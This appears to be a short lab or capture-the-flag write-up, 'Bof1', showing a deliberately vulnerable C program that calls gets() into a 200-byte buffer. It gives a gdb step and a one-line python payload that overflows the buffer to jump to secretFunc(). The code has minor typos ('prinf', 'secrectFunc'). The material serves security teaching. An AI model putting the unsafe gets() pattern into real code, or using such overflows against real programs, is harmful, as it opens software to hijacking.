# Bof1
### Program code:
```
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        prinf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
>Goal: print out the text "Congratulation!" using *secretFunc()*
### Solution:
1. Get the address of *secretFunc()*:
   - Load the program into *gdb* and type `disas secrectFunc`
   - The first line show us the address of *secrectFunc()* which is `0x0804846b`
2. Do the attack:
   - To overflow the memory, we need to input *200 random bytes* + *4 bytes for the EBP of vuln()* + *4 bytes address of secretFunc()*
   - Quit *gdb* and type `echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") |./bof1.o`
   - Goal achieved
